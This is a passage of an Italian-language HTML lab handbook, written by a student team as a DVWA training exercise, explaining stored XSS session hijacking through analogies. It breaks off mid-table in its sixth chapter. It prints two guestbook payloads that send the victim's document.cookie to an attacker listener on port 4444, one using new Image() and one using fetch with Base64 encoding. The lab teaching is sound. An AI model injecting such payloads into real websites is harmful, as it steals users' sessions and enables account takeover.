@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Stored spiegata semplice — Il furto di sessione di Alice</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,800;1,9..144,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0f14;
+    --bg-alt: #141720;
+    --bg-paper: #f4efe6;
+    --ink: #111216;
+    --ink-muted: #4a4d57;
+    --accent: #00ff88;
+    --accent-dim: #00b864;
+    --danger: #ff5555;
+    --warn: #ffb84d;
+    --gold: #d4a574;
+    --purple: #c084fc;
+    --rule: #2a2e3a;
+    --rule-paper: #c9bfae;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: 'Fraunces', Georgia, serif;
+    background: var(--bg);
+    color: #e8e6df;
+    line-height: 1.7;
+    font-size: 18px;
+    overflow-x: hidden;
+  }
+  code, pre, .mono { font-family: 'JetBrains Mono', 'Courier New', monospace; }
+
+  /* COVER */
+  .cover {
+    min-height: 100vh;
+    padding: 60px 8vw;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    background:
+      radial-gradient(ellipse at top left, rgba(0, 255, 136, 0.08), transparent 60%),
+      radial-gradient(ellipse at bottom right, rgba(255, 85, 85, 0.06), transparent 60%),
+      var(--bg);
+    border-bottom: 1px solid var(--rule);
+    position: relative;
+  }
+  .cover::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+  }
+  .cover-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--accent);
+    z-index: 1;
+  }
+  .cover-top .tag {
+    padding: 6px 14px;
+    border: 1px solid var(--accent);
+    border-radius: 2px;
+  }
+  .cover h1 {
+    font-size: clamp(48px, 9vw, 128px);
+    line-height: 0.95;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    margin: 40px 0 20px;
+    z-index: 1;
+    position: relative;
+  }
+  .cover h1 em {
+    font-style: italic;
+    color: var(--accent);
+    font-weight: 400;
+  }
+  .cover .dek {
+    font-size: clamp(18px, 2vw, 24px);
+    color: #b8b4a8;
+    max-width: 680px;
+    font-style: italic;
+    border-left: 3px solid var(--accent);
+    padding-left: 20px;
+    z-index: 1;
+    position: relative;
+  }
+  .cover-bottom {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    z-index: 1;
+  }
+  .cover-bottom strong { color: #e8e6df; }
+
+  /* TOC */
+  .toc {
+    padding: 80px 8vw;
+    background: var(--bg-alt);
+    border-bottom: 1px solid var(--rule);
+  }
+  .toc h2 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 30px;
+  }
+  .toc ol { list-style: none; counter-reset: cap; }
+  .toc li {
+    counter-increment: cap;
+    padding: 18px 0;
+    border-bottom: 1px solid var(--rule);
+    display: flex;
+    align-items: baseline;
+    gap: 20px;
+    transition: color 0.2s;
+  }
+  .toc li:hover { color: var(--accent); }
+  .toc li::before {
+    content: "0" counter(cap);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    color: var(--ink-muted);
+    min-width: 40px;
+  }
+  .toc a {
+    color: inherit;
+    text-decoration: none;
+    font-size: 22px;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+  }
+
+  /* CHAPTERS */
+  .chapter {
+    padding: 100px 8vw;
+    max-width: 1400px;
+    margin: 0 auto;
+    border-bottom: 1px solid var(--rule);
+  }
+  .chapter-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+  }
+  .chapter h2 {
+    font-size: clamp(36px, 5vw, 64px);
+    line-height: 1.05;
+    font-weight: 800;
+    letter-spacing: -0.025em;
+    margin-bottom: 40px;
+    max-width: 900px;
+  }
+  .chapter h2 em { color: var(--accent); font-style: italic; font-weight: 400; }
+  .chapter h3 {
+    font-size: 24px;
+    font-weight: 600;
+    margin: 40px 0 16px;
+    color: #fff;
+    letter-spacing: -0.01em;
+  }
+  .chapter p {
+    font-size: 19px;
+    line-height: 1.75;
+    margin-bottom: 20px;
+    max-width: 720px;
+    color: #d4d1c7;
+  }
+  .chapter p strong { color: #fff; font-weight: 600; }
+  .chapter p em { color: var(--accent); font-style: italic; }
+
+  .metaphor {
+    background: linear-gradient(135deg, rgba(212, 165, 116, 0.08), rgba(212, 165, 116, 0.02));
+    border-left: 4px solid var(--gold);
+    padding: 28px 32px;
+    margin: 32px 0;
+    border-radius: 0 4px 4px 0;
+    max-width: 760px;
+  }
+  .metaphor::before {
+    content: "🎭 Analogia";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--gold);
+    margin-bottom: 12px;
+  }
+  .metaphor p { font-size: 18px; color: #e8d9c2; font-style: italic; max-width: 100%; }
+
+  .danger-box {
+    background: rgba(255, 85, 85, 0.06);
+    border: 1px solid rgba(255, 85, 85, 0.3);
+    padding: 24px 28px;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 760px;
+  }
+  .danger-box::before {
+    content: "⚠️ Attenzione";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--danger);
+    margin-bottom: 10px;
+  }
+  .danger-box p { font-size: 16px; color: #f0d4d4; max-width: 100%; }
+
+  .tip-box {
+    background: rgba(0, 255, 136, 0.05);
+    border: 1px solid rgba(0, 255, 136, 0.25);
+    padding: 24px 28px;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 760px;
+  }
+  .tip-box::before {
+    content: "💡 Suggerimento";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+  .tip-box p { font-size: 16px; color: #c8e8d4; max-width: 100%; }
+
+  .bypass-box {
+    background: rgba(192, 132, 252, 0.06);
+    border: 1px solid rgba(192, 132, 252, 0.3);
+    padding: 24px 28px;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 760px;
+  }
+  .bypass-box::before {
+    content: "🧪 Tecnica di Bypass";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--purple);
+    margin-bottom: 10px;
+  }
+  .bypass-box p { font-size: 16px; color: #e6d9f5; max-width: 100%; }
+
+  pre {
+    background: #000;
+    border: 1px solid var(--rule);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 24px 0;
+    overflow-x: auto;
+    font-size: 14px;
+    line-height: 1.6;
+    color: var(--accent);
+    border-radius: 2px;
+    max-width: 900px;
+    position: relative;
+  }
+  pre::before {
+    content: attr(data-label);
+    position: absolute;
+    top: -10px;
+    left: 16px;
+    background: var(--bg);
+    padding: 0 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+  }
+  pre.highlight {
+    border-left-color: var(--warn);
+    color: var(--warn);
+  }
+  pre.danger-code {
+    border-left-color: var(--danger);
+    color: var(--danger);
+  }
+  code:not(pre code) {
+    background: var(--bg-alt);
+    border: 1px solid var(--rule);
+    padding: 2px 8px;
+    border-radius: 3px;
+    font-size: 0.85em;
+    color: var(--accent);
+  }
+
+  .screenshot-slot {
+    background:
+      repeating-linear-gradient(45deg, var(--bg-alt), var(--bg-alt) 10px, #1a1d27 10px, #1a1d27 20px);
+    border: 2px dashed var(--rule);
+    padding: 60px 30px;
+    text-align: center;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 900px;
+  }
+  .screenshot-slot .label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    margin-bottom: 12px;
+  }
+  .screenshot-slot .title {
+    font-size: 20px;
+    font-weight: 600;
+    color: #b8b4a8;
+    margin-bottom: 8px;
+  }
+  .screenshot-slot .hint {
+    font-size: 14px;
+    color: var(--ink-muted);
+    font-style: italic;
+  }
+
+  .story-grid {
+    display: grid;
+    grid-template-columns: 80px 1fr;
+    gap: 32px;
+    margin: 40px 0;
+    max-width: 900px;
+  }
+  .story-grid .num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 48px;
+    font-weight: 700;
+    color: var(--accent);
+    line-height: 1;
+    letter-spacing: -0.05em;
+  }
+  .story-grid h4 {
+    font-size: 22px;
+    font-weight: 600;
+    margin-bottom: 12px;
+    color: #fff;
+  }
+  .story-grid p { max-width: 100%; margin-bottom: 12px; }
+
+  .table-query {
+    width: 100%;
+    max-width: 900px;
+    border-collapse: collapse;
+    margin: 24px 0;
+    background: var(--bg-alt);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  .table-query th, .table-query td {
+    padding: 14px 18px;
+    text-align: left;
+    border-bottom: 1px solid var(--rule);
+    font-size: 15px;
+  }
+  .table-query th {
+    background: #000;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+  }
+  .table-query td.mono { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); }
+
+  /* PAYLOAD CARD */
+  .query-card {
+    background: linear-gradient(135deg, #0a0c10, #141720);
+    border: 1px solid var(--rule);
+    border-radius: 6px;
+    padding: 0;
+    margin: 32px 0;
+    max-width: 900px;
+    overflow: hidden;
+  }
+  .query-card .qc-header {
+    background: #000;
+    padding: 14px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--rule);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  .query-card .qc-header .level {
+    padding: 3px 10px;
+    background: var(--accent);
+    color: #000;
+    border-radius: 2px;
+    font-weight: 700;
+  }
+  .query-card .qc-header .level.medium { background: var(--warn); }
+  .query-card .qc-header .level.bonus { background: var(--purple); color: #fff; }
+  .query-card .qc-body { padding: 24px; }
+  .query-card .qc-body pre { margin: 0 0 16px 0; border-left-color: var(--accent); }
+  .query-card .qc-caption {
+    font-size: 14px;
+    color: #b8b4a8;
+    font-style: italic;
+    line-height: 1.6;
+  }
+
+  /* BROWSER / LISTENER MOCKUPS */
+  .burp-mock {
+    background: #2b2b2b;
+    border: 1px solid #555;
+    border-radius: 6px;
+    margin: 32px 0;
+    max-width: 900px;
+    font-family: 'JetBrains Mono', monospace;
+    overflow: hidden;
+  }
+  .burp-mock .burp-top {
+    background: linear-gradient(to bottom, #d97706, #b45309);
+    color: #fff;
+    padding: 8px 14px;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    display: flex;
+    justify-content: space-between;
+  }
+  .burp-mock .burp-tabs {
+    background: #1e1e1e;
+    padding: 6px 14px;
+    font-size: 11px;
+    color: #ccc;
+    border-bottom: 1px solid #444;
+  }
+  .burp-mock .burp-tabs span {
+    padding: 4px 12px;
+    display: inline-block;
+  }
+  .burp-mock .burp-tabs span.active {
+    background: #2b2b2b;
+    color: var(--accent);
+    border-radius: 3px 3px 0 0;
+  }
+  .burp-mock .burp-body {
+    padding: 18px 22px;
+    color: #ddd;
+    font-size: 13px;
+    line-height: 1.7;
+  }
+  .burp-mock .burp-body .highlight-param {
+    background: rgba(0, 255, 136, 0.15);
+    color: var(--accent);
+    padding: 1px 4px;
+    border-radius: 2px;
+  }
+
+  /* TERMINAL MOCK — per far vedere il listener in azione */
+  .term-mock {
+    background: #0a0a0a;
+    border: 1px solid #333;
+    border-radius: 6px;
+    margin: 32px 0;
+    max-width: 900px;
+    font-family: 'JetBrains Mono', monospace;
+    overflow: hidden;
+  }
+  .term-mock .term-top {
+    background: linear-gradient(to bottom, #2a2a2a, #1a1a1a);
+    padding: 8px 14px;
+    display: flex;
+    gap: 6px;
+    align-items: center;
+    border-bottom: 1px solid #333;
+  }
+  .term-mock .term-top .dot {
+    width: 12px; height: 12px; border-radius: 50%;
+  }
+  .term-mock .term-top .dot.red { background: #ff5f56; }
+  .term-mock .term-top .dot.yel { background: #ffbd2e; }
+  .term-mock .term-top .dot.grn { background: #27c93f; }
+  .term-mock .term-top .title {
+    color: #888; font-size: 11px; margin-left: 10px;
+    letter-spacing: 0.1em;
+  }
+  .term-mock .term-body {
+    padding: 16px 20px;
+    font-size: 13px;
+    line-height: 1.6;
+    color: #d4d1c7;
+    white-space: pre;
+    overflow-x: auto;
+  }
+  .term-mock .term-body .ok { color: var(--accent); }
+  .term-mock .term-body .warn { color: var(--warn); }
+  .term-mock .term-body .danger { color: var(--danger); font-weight: 700; }
+  .term-mock .term-body .muted { color: #666; }
+  .term-mock .term-body .cyan { color: #5bc0de; }
+
+  /* FLOW DIAGRAM */
+  .flow-diagram {
+    background: var(--bg-alt);
+    border: 1px solid var(--rule);
+    border-radius: 6px;
+    padding: 32px;
+    margin: 32px 0;
+    max-width: 900px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.8;
+    color: #b8b4a8;
+  }
+  .flow-diagram .arrow {
+    color: var(--accent);
+    font-weight: 700;
+  }
+  .flow-diagram .actor-a { color: var(--danger); font-weight: 700; }
+  .flow-diagram .actor-v { color: var(--purple); font-weight: 700; }
+  .flow-diagram .actor-s { color: var(--gold); font-weight: 700; }
+
+  /* FINALE */
+  .finale {
+    padding: 120px 8vw;
+    text-align: center;
+    background:
+      radial-gradient(ellipse at center, rgba(0, 255, 136, 0.08), transparent 70%),
+      var(--bg);
+  }
+  .finale h2 {
+    font-size: clamp(48px, 8vw, 96px);
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    line-height: 1;
+    margin-bottom: 30px;
+  }
+  .finale h2 em { color: var(--accent); font-style: italic; font-weight: 400; }
+  .finale p { max-width: 600px; margin: 0 auto 20px; font-size: 20px; color: #d4d1c7; }
+
+  footer {
+    padding: 40px 8vw;
+    border-top: 1px solid var(--rule);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 20px;
+  }
+  footer .classified { color: var(--danger); }
+
+  @media (max-width: 768px) {
+    .chapter, .toc { padding: 60px 6vw; }
+    .cover { padding: 40px 6vw; }
+    .story-grid { grid-template-columns: 1fr; gap: 8px; }
+    .story-grid .num { font-size: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- COPERTINA -->
+<section class="cover">
+  <div class="cover-top">
+    <span class="tag">■ Lab Handbook · v2.0</span>
+    <span>Build Week · Giorno 2 · Task 02</span>
+  </div>
+
+  <div>
+    <h1>Come si ruba<br>una <em>sessione</em><br>senza sapere<br>la password.</h1>
+    <p class="dek">
+      Una guida illustrata per capire, passo per passo, cosa succede quando un sito web si fida troppo di quello che scrivono gli utenti. Niente prerequisiti. Solo un bar con una bacheca e un biglietto magico.
+    </p>
+  </div>
+
+  <div class="cover-bottom">
+    <div>
+      <strong>Il caso studio:</strong><br>
+      Alice, Bob e la bacheca · DVWA · Metasploitable
+    </div>
+    <div style="text-align: right;">
+      <strong>Team - DIGITAL AVENGERS</strong><br>
+      Uso didattico · Solo lab autorizzati
+    </div>
+  </div>
+
+  <div class="cover-bottom">
+    <div>
+      <strong>Made By:</strong><br>
+      <strong>Lorenzo Petrucci</strong> -
+      <strong>Christian Koscielniak Pinto</strong> -
+      <strong>Gabriele Chinnici</strong> -
+      <strong>Wafa Saghir</strong> -
+      <strong>Amy Antonella Acosta Hugo</strong> -
+      <strong>Domenico Mendola</strong> -
+      <strong>Corrado Vaccarecci</strong>
+    </div>
+  </div>
+</section>
+
+<!-- INDICE -->
+<nav class="toc">
+  <h2>Indice</h2>
+  <ol>
+    <li><a href="#cap1">Cos'è un cookie (e perché è un braccialetto magico)</a></li>
+    <li><a href="#cap2">La bacheca del bar e il biglietto magico</a></li>
+    <li><a href="#cap3">Cos'è uno script (e perché il browser gli obbedisce)</a></li>
+    <li><a href="#cap4">La cassetta postale di Bob: il listener su porta 4444</a></li>
+    <li><a href="#cap5">Il primo biglietto: <code>new Image()</code></a></li>
+    <li><a href="#cap6">Il secondo biglietto, più raffinato: <code>fetch + btoa</code></a></li>
+    <li><a href="#cap7">Alice entra nel bar e legge la bacheca</a></li>
+    <li><a href="#cap8">Bob diventa Alice (senza sapere la sua password)</a></li>
+    <li><a href="#cap9">Livello medio: il buttafuori un po' distratto</a></li>
+    <li><a href="#cap10">Il trucco del <em>CaMeLcAsE</em></a></li>
+    <li><a href="#cap11">Cosa abbiamo catturato: il dump completo</a></li>
+    <li><a href="#cap12">Come difendersi. Davvero.</a></li>
+  </ol>
+</nav>
+
+<!-- CAPITOLO 1 -->
+<article class="chapter" id="cap1">
+  <div class="chapter-num">Capitolo 01</div>
+  <h2>Cos'è un cookie. E perché è un <em>braccialetto magico</em>.</h2>
+
+  <p>Quando apri un sito e fai login — che sia Instagram, la banca o la webmail del lavoro — il sito ti consegna un piccolo oggetto invisibile: il <strong>cookie di sessione</strong>. Non è niente di più di una stringa di caratteri salvata nel tuo browser.</p>
+
+  <div class="metaphor">
+    <p>Immagina il tuo sito preferito come un luna park. Quando entri, paghi il biglietto una volta (la password) e al polso ti mettono un braccialetto colorato. Da quel momento, ogni volta che salti da un'attrazione all'altra, mostri il braccialetto e ti fanno passare. Il cookie è quel braccialetto.</p>
+  </div>
+
+  <p>Tecnicamente è una riga così:</p>
+
+  <pre data-label="Un cookie di sessione DVWA">PHPSESSID=3h7k9abc2def4xyz; security=low</pre>
+
+  <p>Il punto cruciale: il sito ti riconosce <em>solo</em> grazie a quel braccialetto. Non ti chiede la password ad ogni click. Il che porta a una conseguenza inquietante: <strong>chi ha il braccialetto è te</strong>. Anche se non ha mai saputo la tua password.</p>
+
+  <div class="danger-box">
+    <p>Rubare un cookie di sessione equivale a rubare l'identità online della vittima, per tutta la durata di quella sessione. Si chiama <strong>session hijacking</strong> — dirottamento di sessione.</p>
+  </div>
+</article>
+
+<!-- CAPITOLO 2 -->
+<article class="chapter" id="cap2">
+  <div class="chapter-num">Capitolo 02</div>
+  <h2>La bacheca del bar e il <em>biglietto magico</em>.</h2>
+
+  <p>Esistono siti web — forum, guestbook, sezioni commenti, profili social — dove gli utenti possono scrivere testi che <strong>verranno letti da tutti gli altri utenti</strong>. Sono una "bacheca pubblica".</p>
+
+  <div class="metaphor">
+    <p>Pensa a una bacheca di sughero nel bar sotto casa. Chiunque entra può appendere un biglietto. Chiunque passa lo può leggere. Finché i biglietti sono cose tipo "cerco coinquilino" o "vendo bici", tutto bene.</p>
+    <p style="margin-top:12px;">Ma cosa succede se qualcuno appende un biglietto che, quando lo leggi, ti <strong>fruga nelle tasche</strong> senza che tu te ne accorga?</p>
+  </div>
+
+  <p>Questo è esattamente quello che permette una vulnerabilità di tipo <strong>Cross-Site Scripting (XSS)</strong>. Quando si chiama <em>Stored</em> (persistente), il "biglietto magico" viene salvato nel database del sito: rimane lì, e <strong>chiunque apra la pagina si becca l'attacco</strong>.</p>
+
+  <p>Nel nostro laboratorio la "bacheca" è il <em>Guestbook</em> di DVWA: una paginetta innocua dove ogni utente lascia nome e messaggio. Noi ci appenderemo un biglietto molto particolare.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_01.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 1 — Pagina XSS Stored di DVWA
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 3 -->
+<article class="chapter" id="cap3">
+  <div class="chapter-num">Capitolo 03</div>
+  <h2>Cos'è uno script. E perché il browser <em>gli obbedisce</em>.</h2>
+
+  <p>Ogni pagina web è fatta di tre cose: HTML (la struttura, i paragrafi, i bottoni), CSS (i colori, i font) e <strong>JavaScript</strong> (le azioni: cosa succede quando clicchi un bottone, quando la pagina si carica, quando scrolli).</p>
+
+  <p>Il JavaScript viene scritto dentro un tag speciale, <code>&lt;script&gt;</code>. Quando il browser incontra quel tag, fa una cosa semplicissima: <em>esegue il codice</em>. Non si chiede chi l'ha scritto, non si chiede se è una buona idea. Esegue.</p>
+
+  <pre data-label="Un innocuo script JavaScript">&lt;script&gt;alert("Ciao!");&lt;/script&gt;</pre>
+
+  <div class="metaphor">
+    <p>Il browser è come un maggiordomo iper-obbediente. Se sulla lettera dei comandi c'è scritto <em>"porta il tè"</em>, porta il tè. Se c'è scritto <em>"apri la cassaforte e manda il contenuto a questo indirizzo"</em>, lo fa senza batter ciglio — a patto che la lettera sia sulla carta intestata giusta (cioè dentro un tag <code>&lt;script&gt;</code>).</p>
+  </div>
+
+  <p>Il trucco dell'XSS è proprio questo: noi scriviamo il biglietto sulla bacheca in modo che contenga un tag <code>&lt;script&gt;</code>. Quando un altro utente apre la pagina, il <em>suo</em> browser — che non ha modo di distinguere tra codice legittimo del sito e codice iniettato da un attaccante — esegue quello script <strong>con i pieni poteri dell'utente</strong>.</p>
+
+  <div class="tip-box">
+    <p>La regola generale: se un sito lascia passare i tag HTML/JS scritti dagli utenti senza filtrarli, è come un bar che lascia chiunque cambiare la ricetta del caffè. Prima o poi qualcuno ci mette dentro del veleno.</p>
+  </div>
+</article>
+
+<!-- CAPITOLO 4 -->
+<article class="chapter" id="cap4">
+  <div class="chapter-num">Capitolo 04</div>
+  <h2>La cassetta postale di Bob: <em>il listener sulla porta 4444</em>.</h2>
+
+  <p>Prima di appendere il biglietto magico, Bob deve preparare un posto dove far <strong>arrivare la refurtiva</strong>. Il biglietto farà partire una richiesta verso un indirizzo di rete: quell'indirizzo deve essere pronto a ricevere.</p>
+
+  <div class="metaphor">
+    <p>Il biglietto magico è come un messaggero che corre verso un indirizzo specifico. Se all'arrivo non c'è nessuno a prendere la busta, il messaggero torna indietro e il colpo è fallito. Bob deve essere <em>fisicamente presente</em> alla cassetta postale, in ascolto.</p>
+  </div>
+
+  <p>Nel nostro caso Bob è sulla Kali, IP <strong><code>192.168.104.100</code></strong>, e decide di ricevere le "lettere" sulla porta <strong><code>4444</code></strong>. Scrive un piccolo programma in Python che apre quella porta, ascolta tutto quello che arriva e lo stampa pulito a video, salvando i dati anche su file.</p>
+
+  <pre data-label="Terminale Kali — avvio del listener">$ python3 cookie_catcher.py
+[+] Cookie Catcher — Digital Avengers Build Week
+[+] Listening on http://0.0.0.0:4444
+[+] JSONL log : logs/stolen_cookies.jsonl
+[+] CSV  log  : logs/stolen_cookies.csv
+[+] Endpoints : /?c=&lt;cookie&gt; | /?cookie=&lt;base64&gt; | catch-all</pre>
+
+  <p>Da questo momento, qualunque richiesta HTTP arrivi a <code>192.168.104.100:4444</code> verrà catturata, registrata e mostrata sullo schermo di Bob. La cassetta postale è aperta.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/flask_01.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 1 — Listener Flask attivo sulla Kali
+  </p>
+</div>
+
+  <div class="tip-box">
+    <p>Scegliere la porta 4444 non è un caso: è una porta "alta" (non privilegiata), comunemente usata nei lab didattici per ricevitori di reverse-shell, beacon e in generale qualsiasi callback da un target compromesso. È una convenzione che ritroverai ovunque in CTF e corsi di offensive security.</p>
+  </div>
+</article>
+
+<!-- CAPITOLO 5 -->
+<article class="chapter" id="cap5">
+  <div class="chapter-num">Capitolo 05</div>
+  <h2>Il primo biglietto: <em><code>new Image()</code></em>.</h2>
+
+  <p>Bob apre DVWA, fa login, imposta Security Level = <code>low</code> e va nella pagina <em>XSS (Stored)</em>. Nel campo <strong>Message</strong> del guestbook scrive questo:</p>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Main Task — DVWA Security</span>
+      <span class="level">LOW</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Da incollare nel campo Message del Guestbook">&lt;script&gt;new Image().src='http://192.168.104.100:4444/?c='+document.cookie;&lt;/script&gt;</pre>
+      <p class="qc-caption">Script inline che, quando eseguito, legge i cookie della pagina corrente e li invia al listener di Bob come query-string di una finta richiesta immagine.</p>
+    </div>
+  </div>
+
+  <p>Sembrano geroglifici. In realtà è una sequenza di 3 passaggi semplicissimi.</p>
+
+  <div class="story-grid">
+    <div class="num">1</div>
+    <div>
+      <h4><code>new Image()</code> — "crea un'immagine in memoria"</h4>
+      <p>È come disegnare una cornice vuota in testa, senza metterla al muro. Il browser prepara un oggetto immagine ma non lo mostra ancora da nessuna parte. Finché non gli diciamo <em>quale</em> immagine caricare, quell'oggetto è inerte.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">2</div>
+    <div>
+      <h4><code>.src = '...'</code> — "l'immagine si trova qui"</h4>
+      <p>Appena assegniamo un indirizzo alla proprietà <code>src</code>, il browser <em>parte subito</em> per andarla a prendere. <strong>Questa è la chiave di tutto</strong>: al browser non importa se l'indirizzo punta davvero a un'immagine. Fa comunque la richiesta HTTP. Se non trova un'immagine, pazienza — la richiesta è già partita.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">3</div>
+    <div>
+      <h4><code>'...?c=' + document.cookie</code> — "allega il braccialetto"</h4>
+      <p>Concateniamo all'URL di destinazione il valore di <code>document.cookie</code>, cioè la stringa completa dei cookie della pagina corrente. Risultato: il browser della vittima fa una richiesta del tipo <code>GET /?c=PHPSESSID=xyz789...</code> verso il listener di Bob. Che, ricordiamolo, sta aspettando esattamente questo.</p>
+    </div>
+  </div>
+
+  <div class="metaphor">
+    <p>È come se il biglietto magico facesse partire un piccione viaggiatore con, legato alla zampa, una copia del braccialetto di chi sta leggendo. Il piccione vola dritto alla cassetta postale di Bob.</p>
+  </div>
+
+  <div class="danger-box">
+    <p><strong>Perché funziona?</strong> Per due motivi, entrambi "difetti di nascita" del web:<br>
+    1. La <strong>Same-Origin Policy</strong> blocca la lettura delle risposte cross-origin, non l'invio di richieste. Un <code>&lt;img&gt;</code> può puntare ovunque.<br>
+    2. Il cookie <code>PHPSESSID</code> di DVWA <strong>non ha il flag <code>HttpOnly</code></strong>, quindi JavaScript lo vede. Se lo avesse, <code>document.cookie</code> non lo leggerebbe.</p>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/flask_02-A.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 3A — Payload iniettato nel form Guestbook
+  </p>
+</div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/flask_02-B.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 3B — Payload intercettato dallo scripter
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 6 -->
+<article class="chapter" id="cap6">
+  <div class="chapter-num">Capitolo 06</div>
+  <h2>Il secondo biglietto, più <em>raffinato</em>: <code>fetch</code> + <code>btoa</code>.</h2>
+
+  <p>Il primo biglietto funziona, ma ha un difetto estetico: il cookie viaggia nell'URL <em>in chiaro</em>, con tutti i suoi caratteri speciali (punti e virgola, uguali, spazi). Questi caratteri, se il cookie è complicato, possono rompere l'URL o finire nei log di qualche proxy intermedio con un formato brutto da leggere.</p>
+
+  <p>Bob allora prepara una seconda versione, più elegante:</p>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Variante B — base64 encoding</span>
+      <span class="level">LOW</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Variante raffinata del payload">&lt;script&gt;fetch("http://192.168.104.100:4444/?cookie=" + btoa(document.cookie));&lt;/script&gt;</pre>
+      <p class="qc-caption">Usa l'API <code>fetch</code> al posto del vecchio trucco dell'immagine, e codifica il cookie in Base64 prima di inviarlo — più pulito, meno rumoroso nei log.</p>
+    </div>
+  </div>
+
+  <h3>Le due novità</h3>
+
+  <table class="table-query">
+    <thead>
+      <tr><th>Token</th><th>Cosa fa</th><th>Perché è meglio di prima</th></tr>
+    </thead>
+    <tbody>
